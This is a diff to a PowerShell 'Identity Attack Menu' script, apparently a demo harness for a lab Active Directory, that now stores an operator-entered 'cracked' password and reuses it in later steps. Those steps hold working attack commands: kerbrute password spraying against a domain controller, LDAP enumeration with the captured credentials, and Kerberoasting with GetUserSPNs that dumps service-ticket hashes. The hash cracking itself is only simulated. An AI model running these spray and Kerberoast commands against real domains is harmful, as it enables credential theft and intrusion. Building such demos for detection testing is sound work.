@@ -1,4 +1,4 @@
-﻿﻿﻿# ============================================================
+﻿﻿﻿﻿# ============================================================
 #  Identity Attack Menu - Unmanaged Workstation
 #  Run as Administrator (demo account)
 #  Follows the phased scenario from portable_sender.py
@@ -20,7 +20,6 @@ if (-not $env:ENV_DOMAIN)   { $missing += "ENV_DOMAIN" }
 if (-not $env:ENV_DC_IP)    { $missing += "ENV_DC_IP" }
 if (-not $env:ENV_BL)       { $missing += "ENV_BL" }
 if (-not $env:ENV_DT)       { $missing += "ENV_DT" }
-if (-not $env:ENV_PASSWORD) { $missing += "ENV_PASSWORD" }
 if ($missing.Count -gt 0) {
     Write-Host "[!] Missing environment variables: $($missing -join ', ')" -ForegroundColor Red
     Write-Host "    Set them in cmd before running this script:" -ForegroundColor Yellow
@@ -28,9 +27,19 @@ if ($missing.Count -gt 0) {
     Write-Host '    set ENV_DC_IP=172.16.1.6' -ForegroundColor Gray
     Write-Host '    set ENV_BL=10.3.108.30' -ForegroundColor Gray
     Write-Host '    set ENV_DT=10.3.108.31' -ForegroundColor Gray
-    Write-Host '    set ENV_PASSWORD=<spray password>' -ForegroundColor Gray
     pause
     exit 1
+}
+
+# Password file — written by Step 1 "hash cracking", read by Steps 3/4/7
+$pwdFile = "$idpDir\cracked_password.txt"
+
+function Get-CrackedPassword {
+    if (Test-Path $pwdFile) {
+        return (Get-Content $pwdFile -First 1).Trim()
+    }
+    Write-Host "[!] No cracked password found. Run Step 1 first." -ForegroundColor Red
+    return $null
 }
 
 Write-Host "[+] Config: DOMAIN=$env:ENV_DOMAIN  DC=$env:ENV_DC_IP  BL=$env:ENV_BL  DT=$env:ENV_DT" -ForegroundColor Green
@@ -91,6 +100,8 @@ do {
             Write-Host "    NTLM: 802ec5974a4f18e086e8b1411b2e3ea3" -ForegroundColor White
             Write-Host
             Write-Host "[*] Attempting offline hash cracking..." -ForegroundColor Cyan
+            Write-Host
+            $crackedPwd = Read-Host "  Enter the cracked password for clark.monroe"
 
             # Fake cracking animation
             $fakes = @(
@@ -123,15 +134,17 @@ do {
 
             # Reveal
             Write-Host
-            Write-Host "  802ec5974a4f18e086e8b1411b2e3ea3:$env:ENV_PASSWORD" -ForegroundColor Green
+            Write-Host "  802ec5974a4f18e086e8b1411b2e3ea3:$crackedPwd" -ForegroundColor Green
             Write-Host
             Write-Host "  Session..........: hashcat" -ForegroundColor DarkGray
             Write-Host "  Status...........: Cracked" -ForegroundColor Green
             Write-Host "  Recovered........: 1/1 (100.00%)" -ForegroundColor Green
             Write-Host
 
-            Write-Host "[+] Password cracked: clark.monroe => $env:ENV_PASSWORD" -ForegroundColor Green
-            Write-Host "[*] This password will be used for LDAP recon (Step 3) and kerbrute (Step 4)." -ForegroundColor Cyan
+            # Save for later steps
+            $crackedPwd | Out-File -FilePath $pwdFile -Encoding ASCII
+            Write-Host "[+] Password cracked: clark.monroe => $crackedPwd" -ForegroundColor Green
+            Write-Host "[+] Saved to $pwdFile (used by Steps 3, 4, 7 automatically)" -ForegroundColor Green
             Write-Host "[*] Next: Step 2 (network discovery) to find targets on the subnet." -ForegroundColor Cyan
         }
 
@@ -189,7 +202,8 @@ do {
             try {
                 $ldapPath = "LDAP://$env:ENV_DC_IP"
                 $cred_user = "clark.monroe@$env:ENV_DOMAIN"
-                $cred_pass = $env:ENV_PASSWORD
+                $cred_pass = Get-CrackedPassword
+                if (-not $cred_pass) { break }
                 $entry = New-Object DirectoryServices.DirectoryEntry($ldapPath, $cred_user, $cred_pass)
                 $searcher = New-Object DirectoryServices.DirectorySearcher($entry)
 
@@ -270,9 +284,12 @@ do {
             Write-Host "         DC: $env:ENV_DC_IP  Domain: $env:ENV_DOMAIN" -ForegroundColor Gray
             Write-Host
 
+            $sprayPwd = Get-CrackedPassword
+            if (-not $sprayPwd) { break }
+
             try {
                 $proc = Start-Process -FilePath "$idpDir\kerbrute.exe" `
-                    -ArgumentList "passwordspray --dc $env:ENV_DC_IP -d $env:ENV_DOMAIN `"$userFile`" $env:ENV_PASSWORD" `
+                    -ArgumentList "passwordspray --dc $env:ENV_DC_IP -d $env:ENV_DOMAIN `"$userFile`" $sprayPwd" `
                     -NoNewWindow -Wait -PassThru
                 Write-Host "`n[+] Kerbrute finished (exit code: $($proc.ExitCode))." -ForegroundColor Green
             } catch {
@@ -353,7 +370,10 @@ do {
                 Write-Host "`n[+] TGS hash saved to: $idpDir\kerberoast_hashes.txt" -ForegroundColor Green
             }
             elseif (Test-Path "C:\Program Files\Python312\Scripts\GetUserSPNs.exe") {
-                & "C:\Program Files\Python312\Scripts\GetUserSPNs.exe" "$env:ENV_DOMAIN/natasha:$env:ENV_PASSWORD" -dc-ip $env:ENV_DC_IP -request-user svc_runbook -outputfile "$idpDir\kerberoast_hashes.txt"
+                $kerbPwd = Get-CrackedPassword
+                if ($kerbPwd) {
+                    & "C:\Program Files\Python312\Scripts\GetUserSPNs.exe" "$env:ENV_DOMAIN/natasha:$kerbPwd" -dc-ip $env:ENV_DC_IP -request-user svc_runbook -outputfile "$idpDir\kerberoast_hashes.txt"
+                }
             }
             else {
                 Write-Host "[!] Neither Rubeus.exe nor GetUserSPNs found" -ForegroundColor Red
